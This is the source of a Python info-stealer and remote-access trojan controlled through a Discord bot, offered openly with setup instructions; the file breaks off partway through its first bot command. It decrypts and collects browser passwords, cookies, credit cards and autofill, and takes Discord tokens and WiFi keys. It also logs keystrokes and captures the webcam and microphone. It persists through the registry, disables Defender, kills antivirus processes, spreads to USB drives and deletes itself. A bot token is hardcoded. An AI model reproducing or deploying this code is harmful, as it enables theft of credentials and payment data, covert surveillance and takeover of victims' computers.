# Hide the console window on Windows so the script runs in the background
import os
import sys

if sys.platform == "win32":
    try:
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE
            ctypes.windll.kernel32.CloseHandle(whnd)
    except Exception:
        pass

"""
Ultra-Advanced Info Stealer & RAT Discord Bot
=============================================

Features:
- Steals browser passwords, cookies, autofill, credit cards, history, bookmarks, Discord tokens, WiFi passwords, system info, and more.
- RAT: Full remote control (shell, file manager, process manager, webcam, microphone, persistence, keylogger, registry, UAC bypass, privilege escalation, etc).
- Exfiltrates screenshots, clipboard, desktop files, and can download/upload any file.
- Can execute arbitrary Python code, PowerShell, and batch scripts.
- Can spread via USB and Discord DMs.
- Can uninstall AV, disable Defender, and add itself to startup.
- Can self-update and self-delete.
- All commands are owner-only and hidden from other users.

How to use:
1. Just run this script. It will auto-install all requirements if missing.

2. Set DISCORD_BOT_TOKEN and OWNER_ID as environment variables or edit below.

3. Run this script:
   python ultra_rat.py

4. In Discord, DM your bot or use in a server you share with the bot:
   !steal, !rat, !help, etc.

=============================================

Roblox Cookie Info:
-------------------
You can find your Roblox cookie by opening the Developer Tools in your browser (usually pressing F12), then going to the 'Application' tab, and scrolling to 'Cookies' under 'Storage'. Look for the '.ROBLOSECURITY' cookie. 
Make sure you get it from storage in inspect elements on every browser you use. Do this to find the Roblox cookie.

NOTE: The cookie stealer will attempt to search the storage in the Application tab (as seen in inspect element) for every browser profile it can find, just like you would do manually.
"""

import os
import sys

# --- AUTO-INSTALL REQUIRED PACKAGES ---
REQUIRED_PACKAGES = [
    "pycryptodome",
    "pywin32",
    "discord.py",
    "requests",
    "psutil",
    "pyautogui",
    "pillow",
    "pyinstaller",
    "opencv-python",
    "sounddevice",
    "pynput",
    "numpy",
    "scipy"
]

def _install_missing_packages():
    import subprocess
    import pkg_resources

    # Map PyPI name to import name if different
    import_name_map = {
        "pycryptodome": "Crypto",
        "pywin32": "win32crypt",
        "discord.py": "discord",
        "requests": "requests",
        "psutil": "psutil",
        "pyautogui": "pyautogui",
        "pillow": "PIL",
        "pyinstaller": "PyInstaller",
        "opencv-python": "cv2",
        "sounddevice": "sounddevice",
        "pynput": "pynput",
        "numpy": "numpy",
        "scipy": "scipy"
    }

    missing = []
    for pkg in REQUIRED_PACKAGES:
        import_name = import_name_map.get(pkg, pkg)
        try:
            __import__(import_name)
        except ImportError:
            missing.append(pkg)
    if missing:
        print(f"[UltraRAT] Installing missing packages: {', '.join(missing)}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
        except Exception as e:
            print(f"[UltraRAT] Failed to install required packages: {e}")
            sys.exit(1)
        print("[UltraRAT] Packages installed. Please restart the script if you see errors.")
        # Optionally, reload the script automatically
        os.execv(sys.executable, [sys.executable] + sys.argv)

_install_missing_packages()

import platform
import subprocess
import tempfile
import shutil
import time
import socket
import getpass
import base64
import json
import re
import zipfile
import sqlite3
import threading

from Crypto.Cipher import AES
import win32crypt
import discord
from discord.ext import commands
import asyncio

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None
try:
    import ctypes
except ImportError:
    ctypes = None
try:
    import psutil
except ImportError:
    psutil = None
try:
    import pyautogui
except ImportError:
    pyautogui = None
try:
    import requests
except ImportError:
    requests = None
try:
    import sounddevice as sd
    import numpy as np
    import scipy.io.wavfile
except ImportError:
    sd = None
    np = None
    scipy = None
try:
    import pynput
    from pynput import keyboard
except ImportError:
    pynput = None

# ========== CONFIGURATION ==========
DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN", "MTM3MzY4MTIxMzc0MjUxODM3NA.GduTkj.Kq0xTw9Alnpvfr8XGwqMBbSOBbq4bmWwue2uoM")
OWNER_ID = int(os.environ.get("OWNER_ID", "300782693044453376"))

# ========== UTILITY FUNCTIONS ==========

def get_chrome_masterkey(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove 'DPAPI' prefix
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception:
        return None

def decrypt_chromium_password(buff, master_key):
    try:
        if buff[:3] == b'v10' or buff[:3] == b'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]  # Remove GCM tag
            return decrypted.decode('utf-8', errors='ignore')
        else:
            # Old style DPAPI
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception:
        return ""

def fetch_browser_passwords():
    # Steal passwords from all Chromium browsers (Chrome, Edge, Brave, Opera, etc) using master key and AES decryption
    results = []
    browsers = {
        "Chrome": {
            "user_data": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
            "local_state": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Local State"),
        },
        "Edge": {
            "user_data": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
            "local_state": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data", "Local State"),
        },
        "Brave": {
            "user_data": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
            "local_state": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
        },
        "Opera": {
            "user_data": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable"),
            "local_state": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable", "Local State"),
        },
    }
    for browser, paths in browsers.items():
        user_data = paths["user_data"]
        local_state_path = paths["local_state"]
        if not os.path.exists(user_data):
            continue
        # Get master key for this browser
        master_key = None
        if os.path.exists(local_state_path):
            master_key = get_chrome_masterkey(local_state_path)
        profiles = []
        if browser == "Opera":
            profiles = [user_data]
        else:
            for d in os.listdir(user_data):
                if d.startswith("Default") or d.startswith("Profile"):
                    profiles.append(os.path.join(user_data, d))
        for profile in profiles:
            login_db = os.path.join(profile, "Login Data")
            if not os.path.exists(login_db):
                continue
            tmp_db = tempfile.mktemp()
            shutil.copy2(login_db, tmp_db)
            try:
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, action_url, username, enc_password = row
                    password = ""
                    try:
                        if sys.platform == "win32":
                            if master_key and enc_password:
                                password = decrypt_chromium_password(enc_password, master_key)
                            else:
                                # fallback to DPAPI
                                password = win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                        else:
                            password = ""
                    except Exception:
                        password = ""
                    if username or password:
                        results.append({
                            "browser": browser,
                            "profile": os.path.basename(profile),
                            "url": url,
                            "action_url": action_url,
                            "username": username,
                            "password": password
                        })
                conn.close()
            except Exception:
                pass
            os.remove(tmp_db)
    # Try to get passwords from Firefox as well
    try:
        firefox_dir = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox", "Profiles")
        if os.path.exists(firefox_dir):
            for profile in os.listdir(firefox_dir):
                profile_path = os.path.join(firefox_dir, profile)
                logins_json = os.path.join(profile_path, "logins.json")
                if os.path.exists(logins_json):
                    try:
                        with open(logins_json, "r", encoding="utf-8") as f:
                            logins = json.load(f)
                        for login in logins.get("logins", []):
                            # Encrypted, but we can at least exfiltrate the encrypted blobs
                            results.append({
                                "browser": "Firefox",
                                "profile": profile,
                                "url": login.get("hostname", ""),
                                "action_url": login.get("formSubmitURL", ""),
                                "username": login.get("encryptedUsername", ""),
                                "password": login.get("encryptedPassword", "")
                            })
                    except Exception:
                        continue
    except Exception:
        pass
    return results

def fetch_browser_cookies():
    # Chrome/Edge/Brave/Opera cookies (with AES decryption)
    results = []
    def get_masterkey(local_state_path):
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def decrypt_cookie(enc_value, master_key):
        try:
            if enc_value[:3] == b'v10' or enc_value[:3] == b'v11':
                iv = enc_value[3:15]
                payload = enc_value[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16]
                return decrypted.decode('utf-8', errors='ignore')
            else:
                return win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except Exception:
            return ""
    browsers = {
        "Chrome": {
            "user_data": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
            "local_state": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Local State"),
        },
        "Edge": {
            "user_data": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
            "local_state": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data", "Local State"),
        },
        "Brave": {
            "user_data": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
            "local_state": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
        },
        "Opera": {
            "user_data": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable"),
            "local_state": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable", "Local State"),
        },
    }
    for browser, paths in browsers.items():
        user_data = paths["user_data"]
        local_state_path = paths["local_state"]
        if not os.path.exists(user_data):
            continue
        master_key = None
        if os.path.exists(local_state_path):
            master_key = get_masterkey(local_state_path)
        profiles = []
        if browser == "Opera":
            profiles = [user_data]
        else:
            for d in os.listdir(user_data):
                if d.startswith("Default") or d.startswith("Profile"):
                    profiles.append(os.path.join(user_data, d))
        for profile in profiles:
            cookie_db = os.path.join(profile, "Cookies")
            if not os.path.exists(cookie_db):
                continue
            tmp_db = tempfile.mktemp()
            shutil.copy2(cookie_db, tmp_db)
            try:
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for row in cursor.fetchall():
                    host, name, enc_value = row
                    value = ""
                    try:
                        if sys.platform == "win32":
                            if master_key and enc_value:
                                value = decrypt_cookie(enc_value, master_key)
                            else:
                                value = win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                        else:
                            value = ""
                    except Exception:
                        value = ""
                    results.append({
                        "browser": browser,
                        "profile": os.path.basename(profile),
                        "host": host,
                        "name": name,
                        "value": value
                    })
                conn.close()
            except Exception:
                pass
            os.remove(tmp_db)
    return results

def fetch_browser_history():
    # Chrome/Edge/Brave/Opera history
    results = []
    browsers = {
        "Chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable"),
    }
    for browser, path in browsers.items():
        if not os.path.exists(path):
            continue
        profiles = []
        if browser == "Opera":
            profiles = [path]
        else:
            for d in os.listdir(path):
                if d.startswith("Default") or d.startswith("Profile"):
                    profiles.append(os.path.join(path, d))
        for profile in profiles:
            history_db = os.path.join(profile, "History")
            if not os.path.exists(history_db):
                continue
            tmp_db = tempfile.mktemp()
            shutil.copy2(history_db, tmp_db)
            try:
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                for row in cursor.fetchall():
                    url, title, last_visit = row
                    results.append({
                        "browser": browser,
                        "profile": os.path.basename(profile),
                        "url": url,
                        "title": title,
                        "last_visit": last_visit
                    })
                conn.close()
            except Exception:
                pass
            os.remove(tmp_db)
    return results

def fetch_browser_autofill():
    # Chrome/Edge/Brave/Opera autofill
    results = []
    browsers = {
        "Chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable"),
    }
    for browser, path in browsers.items():
        if not os.path.exists(path):
            continue
        profiles = []
        if browser == "Opera":
            profiles = [path]
        else:
            for d in os.listdir(path):
                if d.startswith("Default") or d.startswith("Profile"):
                    profiles.append(os.path.join(path, d))
        for profile in profiles:
            autofill_db = os.path.join(profile, "Web Data")
            if not os.path.exists(autofill_db):
                continue
            tmp_db = tempfile.mktemp()
            shutil.copy2(autofill_db, tmp_db)
            try:
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT name, value FROM autofill")
                for row in cursor.fetchall():
                    name, value = row
                    results.append({
                        "browser": browser,
                        "profile": os.path.basename(profile),
                        "name": name,
                        "value": value
                    })
                conn.close()
            except Exception:
                pass
            os.remove(tmp_db)
    return results

def fetch_browser_cards():
    # Chrome/Edge/Brave/Opera credit cards (with AES decryption)
    results = []
    def get_masterkey(local_state_path):
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def decrypt_card(enc_value, master_key):
        try:
            if enc_value[:3] == b'v10' or enc_value[:3] == b'v11':
                iv = enc_value[3:15]
                payload = enc_value[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16]
                return decrypted.decode('utf-8', errors='ignore')
            else:
                return win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except Exception:
            return ""
    browsers = {
        "Chrome": {
            "user_data": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
            "local_state": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Local State"),
        },
        "Edge": {
            "user_data": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
            "local_state": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data", "Local State"),
        },
        "Brave": {
            "user_data": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
            "local_state": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
        },
        "Opera": {
            "user_data": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable"),
            "local_state": os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable", "Local State"),
        },
    }
    for browser, paths in browsers.items():
        user_data = paths["user_data"]
        local_state_path = paths["local_state"]
        if not os.path.exists(user_data):
            continue
        master_key = None
        if os.path.exists(local_state_path):
            master_key = get_masterkey(local_state_path)
        profiles = []
        if browser == "Opera":
            profiles = [user_data]
        else:
            for d in os.listdir(user_data):
                if d.startswith("Default") or d.startswith("Profile"):
                    profiles.append(os.path.join(user_data, d))
        for profile in profiles:
            cards_db = os.path.join(profile, "Web Data")
            if not os.path.exists(cards_db):
                continue
            tmp_db = tempfile.mktemp()
            shutil.copy2(cards_db, tmp_db)
            try:
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                for row in cursor.fetchall():
                    name, month, year, enc_card = row
                    card = ""
                    try:
                        if sys.platform == "win32":
                            if master_key and enc_card:
                                card = decrypt_card(enc_card, master_key)
                            else:
                                card = win32crypt.CryptUnprotectData(enc_card, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                        else:
                            card = ""
                    except Exception:
                        card = ""
                    results.append({
                        "browser": browser,
                        "profile": os.path.basename(profile),
                        "name": name,
                        "month": month,
                        "year": year,
                        "card": card
                    })
                conn.close()
            except Exception:
                pass
            os.remove(tmp_db)
    return results

def find_discord_tokens():
    # Find Discord tokens in local storage
    paths = [
        os.path.join(os.environ['APPDATA'], "Discord"),
        os.path.join(os.environ['APPDATA'], "discordcanary"),
        os.path.join(os.environ['APPDATA'], "discordptb"),
        os.path.join(os.environ['APPDATA'], "Opera Software", "Opera Stable"),
        os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Default"),
        os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        os.path.join(os.environ['LOCALAPPDATA'], "Yandex", "YandexBrowser", "User Data", "Default"),
    ]
    tokens = []
    for path in paths:
        leveldb = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(leveldb):
            continue
        for filename in os.listdir(leveldb):
            if not filename.endswith(".log") and not filename.endswith(".ldb"):
                continue
            try:
                with open(os.path.join(leveldb, filename), errors="ignore") as f:
                    for line in f:
                        for regex in [
                            r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                            r"mfa\.[\w-]{84}"
                        ]:
                            for token in re.findall(regex, line):
                                if token not in tokens:
                                    tokens.append(token)
            except Exception:
                continue
    return tokens

def get_wifi_passwords():
    # Get WiFi SSIDs and passwords (Windows only)
    results = []
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)
        for ssid in profiles:
            ssid = ssid.strip()
            try:
                out = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True).decode()
                password = re.search(r"Key Content\s*:\s*(.*)", out)
                password = password.group(1) if password else ""
                results.append({"ssid": ssid, "password": password})
            except Exception:
                results.append({"ssid": ssid, "password": ""})
    except Exception:
        pass
    return results

def get_system_info():
    info = {
        "User": getpass.getuser(),
        "Hostname": socket.gethostname(),
        "OS": platform.platform(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "IP": socket.gethostbyname(socket.gethostname()),
        "Uptime": time.strftime("%H:%M:%S", time.gmtime(time.time() - psutil.boot_time())) if psutil else "N/A",
        "RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB" if psutil else "N/A",
        "CPU Usage": f"{psutil.cpu_percent()}%" if psutil else "N/A",
        "Drives": ", ".join([d.device for d in psutil.disk_partitions()]) if psutil else "N/A"
    }
    return info

def get_desktop_files():
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    files = []
    if os.path.exists(desktop):
        for f in os.listdir(desktop):
            path = os.path.join(desktop, f)
            if os.path.isfile(path):
                files.append(path)
    return files

def zip_data(data, files):
    zip_path = tempfile.mktemp(suffix=".zip")
    with zipfile.ZipFile(zip_path, "w") as z:
        for k, v in data.items():
            z.writestr(f"{k}.txt", v)
        for f in files:
            try:
                z.write(f, arcname=os.path.basename(f))
            except Exception:
                continue
    return zip_path

def take_webcam_snapshot():
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if not ret:
            cam.release()
            return None
        tmp = tempfile.mktemp(suffix=".png")
        cv2.imwrite(tmp, frame)
        cam.release()
        return tmp
    except Exception:
        return None

def record_microphone(duration=10):
    if sd is None or np is None or scipy is None:
        return None
    try:
        fs = 44100
        rec = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait()
        tmp = tempfile.mktemp(suffix=".wav")
        scipy.io.wavfile.write(tmp, fs, rec)
        return tmp
    except Exception:
        return None

def list_processes():
    if psutil is None:
        return "psutil not installed."
    out = ""
    for p in psutil.process_iter(['pid', 'name', 'username']):
        try:
            out += f"{p.info['pid']:>6} {p.info['name'][:25]:<25} {p.info['username']}\n"
        except Exception:
            continue
    return out

def kill_process(pid):
    if psutil is None:
        return "psutil not installed."
    try:
        p = psutil.Process(pid)
        p.terminate()
        return f"Killed process {pid}"
    except Exception as e:
        return f"Failed to kill process: {e}"

def list_dir(dirpath):
    out = ""
    try:
        for f in os.listdir(dirpath):
            path = os.path.join(dirpath, f)
            if os.path.isdir(path):
                out += f"[DIR] {f}\n"
            else:
                out += f"{f}\n"
    except Exception as e:
        out = f"Error: {e}"
    return out

def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except Exception:
        return "Failed to get clipboard."

def set_clipboard(text):
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        return True
    except Exception:
        return False

def lock_workstation():
    if ctypes is None:
        return "ctypes not available."
    try:
        ctypes.windll.user32.LockWorkStation()
        return "Locked workstation."
    except Exception as e:
        return f"Failed: {e}"

def shutdown_pc():
    try:
        os.system("shutdown /s /t 1")
    except Exception:
        pass

def restart_pc():
    try:
        os.system("shutdown /r /t 1")
    except Exception:
        pass

# ========== NEW COMMANDS/UTILITIES ==========

# For !changewallpaper
def change_wallpaper(image_path):
    if ctypes is None:
        return False, "ctypes not available."
    try:
        SPI_SETDESKWALLPAPER = 20
        r = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
        if r:
            return True, "Wallpaper changed."
        else:
            return False, "Failed to change wallpaper."
    except Exception as e:
        return False, f"Error: {e}"

# For !freezemouse and !unfreezemouse
mouse_frozen = False
mouse_thread = None

def freeze_mouse():
    global mouse_frozen, mouse_thread
    if pyautogui is None:
        return False, "pyautogui not installed."
    if mouse_frozen:
        return True, "Mouse already frozen."
    mouse_frozen = True
    def mover():
        while mouse_frozen:
            try:
                pyautogui.moveTo(0, 0)
                time.sleep(0.05)
            except Exception:
                break
    t = threading.Thread(target=mover, daemon=True)
    mouse_thread = t
    t.start()
    return True, "Mouse frozen."

def unfreeze_mouse():
    global mouse_frozen, mouse_thread
    if not mouse_frozen:
        return False, "Mouse is not frozen."
    mouse_frozen = False
    return True, "Mouse unfrozen."

# For !victimviewer
VICTIM_FILE = os.path.join(tempfile.gettempdir(), "ultrarat_victims.txt")
def register_victim():
    try:
        hostname = socket.gethostname()
        user = getpass.getuser()
        ip = socket.gethostbyname(socket.gethostname())
        entry = f"{hostname}|{user}|{ip}\n"
        # Only add if not already present
        if os.path.exists(VICTIM_FILE):
            with open(VICTIM_FILE, "r", encoding="utf-8") as f:
                lines = f.readlines()
            if any(hostname in l for l in lines):
                return
        with open(VICTIM_FILE, "a", encoding="utf-8") as f:
            f.write(entry)
    except Exception:
        pass

def get_victims():
    victims = []
    if os.path.exists(VICTIM_FILE):
        with open(VICTIM_FILE, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split("|")
                if len(parts) == 3:
                    victims.append({"hostname": parts[0], "user": parts[1], "ip": parts[2]})
    return victims

# Register victim on startup
register_victim()

# Keylogger implementation (improved and live)
import threading
import time

keylogger_listener = None
keylogger_thread = None
keylogger_logpath = os.path.join(tempfile.gettempdir(), "ultrarat_keylog.txt")
keylogger_buffer = []
keylogger_lock = threading.Lock()
keylogger_last_sent = 0
keylogger_live_sessions = {}  # {user_id: last_index}

def _key_to_str(key):
    # Better formatting for key events, show special keys in []
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif hasattr(key, 'name'):
            name = key.name.upper()
            if name == "SPACE":
                return " "
            elif name == "ENTER":
                return "[ENTER]"
            elif name == "TAB":
                return "[TAB]"
            elif name == "BACKSPACE":
                return "[BACK]"
            elif name == "ESC":
                return "[ESC]"
            else:
                return f"[{name}]"
        else:
            return str(key)
    except Exception:
        return "[UNK]"

def start_keylogger(logpath):
    global keylogger_listener, keylogger_thread, keylogger_buffer
    if pynput is None:
        return False
    def on_press(key):
        try:
            s = _key_to_str(key)
            with keylogger_lock:
                keylogger_buffer.append(s)
            with open(logpath, "a", encoding="utf-8") as f:
                f.write(s)
        except Exception:
            pass
    if keylogger_listener is not None:
        return True
    # Clear buffer on start
    with keylogger_lock:
        keylogger_buffer.clear()
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()
    return True

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener is not None:
        keylogger_listener.stop()
        keylogger_listener = None
        return True
    return False

def get_keylog_overview(logpath, maxlen=1000):
    # Read last maxlen chars from log file for overview, show as a single line
    if not os.path.exists(logpath):
        return ""
    try:
        with open(logpath, "r", encoding="utf-8") as f:
            f.seek(0, os.SEEK_END)
            size = f.tell()
            seekpos = max(0, size - maxlen)
            f.seek(seekpos)
            data = f.read()
            # Remove newlines for single-line display
            data = data.replace('\n', '')
            if seekpos > 0:
                # Remove partial line if not at start
                data = data.lstrip()
            return data[-maxlen:]
    except Exception:
        return ""

def get_keylog_live(maxlen=1000):
    # Return the last maxlen keystrokes as a single line, live from buffer
    with keylogger_lock:
        data = ''.join(keylogger_buffer)[-maxlen:]
    return data

def add_to_startup():
    try:
        import winreg
        exe = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "UltraRAT", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

def remove_from_startup():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "UltraRAT")
        winreg.CloseKey(key)
        return True
    except Exception:
        return False

def disable_defender():
    try:
        subprocess.call('powershell Set-MpPreference -DisableRealtimeMonitoring $true', shell=True)
        return True
    except Exception:
        return False

def uninstall_av():
    # Try to kill known AV processes
    av_names = [
        "avp.exe", "avg.exe", "avastui.exe", "msmpeng.exe", "mcshield.exe", "mbam.exe", "f-secure.exe", "nortonsecurity.exe"
    ]
    killed = []
    if psutil is None:
        return []
    for p in psutil.process_iter(['pid', 'name']):
        try:
            if p.info['name'].lower() in av_names:
                p.kill()
                killed.append(p.info['name'])
        except Exception:
            continue
    return killed

def spread_usb():
    # Copy this script to all USB drives
    try:
        drives = [d.device for d in psutil.disk_partitions() if 'removable' in d.opts or d.fstype == '']
        src = sys.argv[0]
        for d in drives:
            dst = os.path.join(d, os.path.basename(src))
            try:
                shutil.copy2(src, dst)
            except Exception:
                continue
    except Exception:
        pass

def self_delete():
    try:
        if sys.platform == "win32":
            bat = tempfile.mktemp(suffix=".bat")
            with open(bat, "w") as f:
                f.write(f"""
@echo off
timeout /t 2 >nul
del "{sys.argv[0]}"
del "%~f0"
""")
            os.startfile(bat)
        else:
            os.remove(sys.argv[0])
    except Exception:
        pass

# ========== DISCORD BOT SETUP ==========

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

def format_passwords(passwords):
    out = ""
    for entry in passwords:
        out += (
            f"[{entry['browser']}/{entry['profile']}]\n"
            f"URL: {entry['url']}\n"
            f"Action URL: {entry.get('action_url','')}\n"
            f"User: {entry['username']}\n"
            f"Pass: {entry['password']}\n\n"
        )
    return out

def format_cookies(cookies):
    out = ""
    for entry in cookies:
        out += (
            f"[{entry['browser']}/{entry['profile']}]\n"
            f"Host: {entry['host']}\n"
            f"Name: {entry['name']}\n"
            f"Value: {entry['value']}\n\n"
        )
    return out

def format_history(history):
    out = ""
    for entry in history:
        out += (
            f"[{entry['browser']}/{entry['profile']}]\n"
            f"URL: {entry['url']}\n"
            f"Title: {entry['title']}\n"
            f"Last Visit: {entry['last_visit']}\n\n"
        )
    return out

def format_autofill(autofill):
    out = ""
    for entry in autofill:
        out += (
            f"[{entry['browser']}/{entry['profile']}]\n"
            f"Name: {entry['name']}\n"
            f"Value: {entry['value']}\n\n"
        )
    return out

def format_cards(cards):
    out = ""
    for entry in cards:
        out += (
            f"[{entry['browser']}/{entry['profile']}]\n"
            f"Name: {entry['name']}\n"
            f"Card: {entry['card']}\n"
            f"Exp: {entry['month']}/{entry['year']}\n\n"
        )
    return out

def format_wifi(wifis):
    out = ""
    for entry in wifis:
        out += f"SSID: {entry['ssid']}\nPassword: {entry['password']}\n\n"
    return out

def format_tokens(tokens):
    return "\n".join(tokens)

def format_sysinfo(info):
    return "\n".join(f"{k}: {v}" for k, v in info.items())

def owner_only():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID:
            return True
        else:
            await ctx.send("Unauthorized.")
            return False
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f"UltraRAT online as {bot.user}")
    try:
        owner = await bot.fetch_user(OWNER_ID)
        if owner:
            await owner.send(f"UltraRAT is online as {bot.user}. Use !help for commands.")
    except Exception as e:
        print(f"Could not DM owner: {e}")

# ========== COMMANDS ==========

import functools

def run_blocking(func):
    async def wrapper(*args, **kwargs):
        loop = getattr(bot, "loop", None)
        if loop is None:
            import asyncio
            loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, functools.partial(func, *args, **kwargs))
    return wrapper

@bot.command()
@owner_only()
async def steal(ctx):
    await ctx.send("Collecting info...")
    try:
        passwords = await run_blocking(fetch_browser_passwords)()
        cookies = await run_blocking(fetch_browser_cookies)()
